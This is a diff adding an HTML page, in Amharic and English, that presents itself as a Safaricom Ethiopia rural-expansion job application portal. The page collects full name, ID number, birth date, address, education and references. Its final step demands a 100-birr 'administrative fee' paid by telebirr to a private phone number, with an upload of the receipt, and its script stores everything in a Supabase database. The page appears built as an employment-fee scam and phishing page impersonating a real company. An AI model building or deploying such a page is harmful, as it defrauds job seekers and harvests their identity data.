@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Safaricom Ethiopia - Rural Expansion Portal</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        :root {
+            --saf-red: #e60000;
+            --gradient: linear-gradient(135deg, #e60000 0%, #7a0000 100%);
+            --vibrant: linear-gradient(90deg, #ff8a00, #e60000, #d400ff);
+        }
+        body { font-family: 'Segoe UI', 'Ubuntu', sans-serif; background: #f8f9fa; margin: 0; padding: 10px; color: #333; }
+        .container { background: #fff; max-width: 1000px; margin: 20px auto; padding: 40px; border-radius: 25px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); border-top: 12px solid var(--saf-red); }
+        
+        h2 { background: var(--vibrant); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-align: center; font-size: 32px; font-weight: 800; }
+        .hero { background: #fff5f5; padding: 30px; border-radius: 15px; border-left: 8px solid var(--saf-red); line-height: 1.9; text-align: justify; margin-bottom: 30px; }
+
+        .tab { display: none; animation: slideIn 0.5s ease; }
+        .active { display: block; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
+        .full { grid-column: 1 / -1; }
+
+        label { font-weight: 700; font-size: 14px; margin-bottom: 8px; display: block; color: #555; }
+        input, select, textarea { width: 100%; padding: 14px; border: 2px solid #eee; border-radius: 10px; font-size: 16px; transition: 0.3s; }
+        input:focus { border-color: var(--saf-red); outline: none; background: #fffcfc; }
+
+        .btn-group { display: flex; justify-content: space-between; margin-top: 40px; padding-top: 20px; border-top: 1px solid #eee; }
+        button { padding: 15px 45px; border-radius: 50px; border: none; cursor: pointer; font-weight: bold; font-size: 17px; transition: 0.4s; }
+        .btn-next { background: var(--gradient); color: white; box-shadow: 0 5px 15px rgba(230,0,0,0.3); }
+        .btn-prev { background: #f0f0f0; color: #555; }
+        button:hover { transform: translateY(-3px); opacity: 0.9; }
+
+        .success-box { text-align: center; display: none; }
+        .success-name { font-size: 45px; font-weight: 900; background: var(--vibrant); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 25px 0; }
+        .lang-card { background: #fdfdfd; padding: 25px; border-radius: 15px; border: 1px solid #eee; text-align: justify; line-height: 1.8; }
+
+        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="landing" class="active">
+        <h2>ሳፋሪኮም ኢትዮጵያ - የገጠር ማስፋፊያ የሥራ ቅጥር</h2>
+        <div class="hero">
+            <p><strong>ክቡራን አመልካቾች፤</strong> ሳፋሪኮም ኢትዮጵያ የዲጂታል አገልግሎቱን ወደ እያንዳንዱ የኢትዮጵያ ገጠር መንደሮች ለማድረስ በወሰነው መሠረት፣ በቴክኖሎጂው ዘርፍ አሻራቸውን የሚያሳርፉ ታታሪ ወጣቶችን ይፈልጋል። ይህ ታላቅ ሀገራዊ ፕሮጀክት የኔትወርክ ተደራሽነትን በማስፋት የዜጎችን ሕይወት ለመለወጥ ያለመ ነው።</p>
+            <p>ምዝገባው በሰከንድ ውስጥ በCloud (Supabase) ስለሚቀመጥ መረጃዎ አይጠፋም። 25ቱን ጥያቄዎች በትዕግስት በመሙላት የዲጂታል ኢትዮጵያ አካል ይሁኑ።</p>
+            <button class="btn-next" style="width:100%" onclick="startForm()">ምዝገባ ለመጀመር እዚህ ይጫኑ / Start Application</button>
+        </div>
+    </div>
+
+    <form id="regForm" style="display:none;">
+        <div class="tab active">
+            <h3 style="color:var(--saf-red)">ደረጃ 1፡ የግል መረጃ (Step 1/4)</h3>
+            <div class="grid">
+                <div><label>1. ሙሉ ስም ከነአባቱ *</label><input id="full_name" required></div>
+                <div><label>2. ጾታ</label><select id="gender"><option>ወንድ</option><option>ሴት</option></select></div>
+                <div><label>3. ስልክ ቁጥር *</label><input id="phone" type="tel" required></div>
+                <div><label>4. የትውልድ ቦታ</label><input id="pob"></div>
+                <div><label>5. ዜግነት</label><input id="nat"></div>
+                <div><label>6. የትውልድ ቀን</label><input type="date" id="dob"></div>
+                <div><label>7. የጋብቻ ሁኔታ</label><input id="marital"></div>
+                <div><label>8. መታወቂያ ቁጥር</label><input id="id_no"></div>
+            </div>
+        </div>
+
+        <div class="tab">
+            <h3 style="color:var(--saf-red)">ደረጃ 2፡ ትምህርትና አድራሻ (Step 2/4)</h3>
+            <div class="grid">
+                <div><label>9. ኢሜል</label><input id="email" type="email"></div>
+                <div><label>10. ክልል</label><input id="region"></div>
+                <div><label>11. ከተማ/ዞን</label><input id="city"></div>
+                <div><label>12. የቤት ቁጥር</label><input id="house"></div>
+                <div><label>13. የትምህርት ደረጃ *</label><input id="edu" required></div>
+                <div><label>14. ተቋም (Institution)</label><input id="inst"></div>
+                <div><label>15. የምረቃ ዓመት</label><input id="grad"></div>
+                <div><label>16. የጥናት መስክ *</label><input id="field" required></div>
+            </div>
+        </div>
+
+        <div class="tab">
+            <h3 style="color:var(--saf-red)">ደረጃ 3፡ ልምድና ክህሎት (Step 3/4)</h3>
+            <div class="grid">
+                <div><label>17. ውጤት (GPA)</label><input id="gpa"></div>
+                <div><label>18. ቋንቋዎች</label><input id="lang"></div>
+                <div><label>19. ልዩ ክህሎት</label><input id="skill"></div>
+                <div><label>20. የሥራ ልምድ (ዓመት)</label><input id="exp"></div>
+                <div><label>21. የመጨረሻ የሥራ መደብ</label><input id="last"></div>
+                <div><label>22. የደመወዝ ፍላጎት</label><input id="sal"></div>
+                <div class="full"><label>23. ማጣቀሻ (References Name & Phone)</label><textarea id="ref" rows="3"></textarea></div>
+            </div>
+        </div>
+
+        <div class="tab">
+            <h3 style="color:var(--saf-red)">ደረጃ 4፡ ክፍያና ፋይሎች (Final Step)</h3>
+            <div style="background:#fff8e1; border:2px dashed #ffc107; padding:25px; border-radius:15px; margin-bottom:20px; text-align:center;">
+                <h4 style="color:#d32f2f; margin:0 0 10px 0;">የቴሌብር (telebirr) አገልግሎት ክፍያ</h4>
+                <p style="font-size:26px; font-weight:900; margin:5px 0; color:#333;">ቁጥር (No): 0924364056</p>
+                <p style="font-size:14px; color:#666;">ማሳሰቢያ፦ ይህ 100 ብር የሲስተም ጥገና እና የሰነድ ማረጋገጫ የአስተዳደር ክፍያ ነው።</p>
+            </div>
+            <div class="grid">
+                <div class="full"><label>24. የክፍያ ደረሰኝ (ፎቶ/Screenshot) *</label><input type="file" id="receipt" required></div>
+                <div class="full"><label>25. ሲቪና የትምህርት ማስረጃዎች (PDF/Image) *</label><input type="file" id="cv_docs" required></div>
+            </div>
+        </div>
+
+        <div class="btn-group">
+            <button type="button" class="btn-prev" id="prevBtn" onclick="move(-1)">ተመለስ / Back</button>
+            <button type="button" class="btn-next" id="nextBtn" onclick="move(1)">ቀጥል / Next</button>
+        </div>
+    </form>
+
+    <div id="success" class="success-box">
+        <h1 style="color:var(--saf-red); font-size:35px;">እንኳን ደስ አለዎት! / Congratulations!</h1>
+        <div id="finalName" class="success-name"></div>
+        <div class="grid" style="margin-top:30px; gap:30px;">
+            <div class="lang-card">
+                <p>የምዝገባ ሂደትዎ በስኬት ተጠናቅቋል። ያስገቡት መረጃ፣ የትምህርት ማስረጃ እና የክፍያ ደረሰኝ በባለሙያዎቻችን እየታየ ይገኛል። መረጃው ተጣርቶ ለሥራው ተመራጭ ሆነው ከተገኙ በቀጣይ ወራት ውስጥ በስልክዎ አጭር የጽሁፍ መልዕክት (SMS) ይላክልዎታል ወይም ስልክ ይደወልልዎታል።</p>
+            </div>
+            <div class="lang-card" style="direction: ltr;">
+                <p>Registration successful! Your data, credentials, and payment receipt are being verified. If selected, you will be notified via SMS or phone call within the coming months. Thank you for your interest in joining Safaricom Ethiopia.</p>
+            </div>
+        </div>
+        <button class="btn-next" style="margin-top:40px;" onclick="clearAndReset()">ጨርስ / Finish</button>
+    </div>
+</div>
+
+<script>
+    // Supabase Configuration
+    const SB_URL = 'https://dypnmbbvhlahjhpmdvno.supabase.co';
+    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImR5cG5tYmJ2aGxhaGpocG1kdm5vIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQwMTA0MzYsImV4cCI6MjA4OTU4NjQzNn0.UvwOCSMHFf2RIpyKzvBdarhOqv63WngWzEDrYhVS_ws';
+
+    const _supabase = supabase.createClient(SB_URL, SB_KEY);
+    let currentTab = 0;
+    const tabs = document.getElementsByClassName("tab");
+
+    // Load draft on startup
+    window.onload = () => {
+        const saved = JSON.parse(localStorage.getItem("saf_expansion_draft") || "{}");
+        Object.keys(saved).forEach(id => { if(document.getElementById(id)) document.getElementById(id).value = saved[id]; });
+    };
+
+    // Save draft as user types
+    document.oninput = () => {
+        let draft = {};
+        document.querySelectorAll("#regForm input, #regForm select, #regForm textarea").forEach(i => { if(i.type !== 'file') draft[i.id] = i.value; });
+        localStorage.setItem("saf_expansion_draft", JSON.stringify(draft));
+    };
+
+    function startForm() { document.getElementById("landing").style.display="none"; document.getElementById("regForm").style.display="block"; showTab(0); }
+
+    function showTab(n) {
+        tabs[n].classList.add("active");
+        document.getElementById("prevBtn").style.display = (n == 0) ? "none" : "inline";
+        document.getElementById("nextBtn").innerText = (n == tabs.length - 1) ? "መረጃውን ላክ / Submit" : "ቀጥል / Next";
+    }
+
+    function move(n) {
+        if (n == 1 && !validate()) return;
+        tabs[currentTab].classList.remove("active");
+        currentTab += n;
+        if (currentTab >= tabs.length) { sendToCloud(); return; }
+        showTab(currentTab);
+        window.scrollTo(0,0);
+    }
+
+    function validate() {
+        let valid = true;
+        tabs[currentTab].querySelectorAll("[required]").forEach(i => {
+            if (!i.value) { i.style.borderColor = "red"; valid = false; }
+            else { i.style.borderColor = "#eee"; }
+        });
+        return valid;
+    }
+
+    async function sendToCloud() {
+        const name = document.getElementById("full_name").value;
+        const phone = document.getElementById("phone").value;
+        const allData = JSON.parse(localStorage.getItem("saf_expansion_draft"));
+
+        const { error } = await _supabase.from('registrations').insert([{ 
+            full_name: name, 
+            phone: phone,
+            all_data: allData 
+        }]);
+
+        if(!error) {
+            localStorage.removeItem("saf_expansion_draft");
+            document.getElementById("regForm").style.display="none";
+            document.getElementById("success").style.display="block";
+            document.getElementById("finalName").innerText = name;
+        } else {
+            alert("ስህተት አጋጥሟል (Error): " + error.message);
+        }
+    }
+
+    function clearAndReset() { location.reload(); }
+</script>
+</body>
+</html>
